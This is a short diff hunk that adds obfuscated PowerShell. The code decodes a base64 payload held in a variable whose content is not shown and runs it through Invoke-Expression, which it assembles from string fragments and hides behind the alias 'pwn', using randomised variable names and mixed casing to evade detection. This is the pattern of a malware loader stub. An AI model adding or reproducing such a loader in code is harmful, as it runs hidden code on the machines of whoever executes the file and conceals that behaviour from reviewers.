@@ -1,0 +1,4 @@
+$5Okw32rznZq = [SystEM.TExT.EnCODing]::utF8.GEtSTRing([SyStEm.coNvErt]::FROmbASe64stRing("$base64")) ;
+
+$7mXeWbuofgMPwBrUc4RkyE = "iN"+"vO"+"KE"+"-e"+"xP"+"RE"+"SS"+"io"+"n" ; NEW-ALias -NAME pwn -valuE $7mXeWbuofgMPwBrUc4RkyE -foRCe ; PwN $5Okw32rznZq ;
+
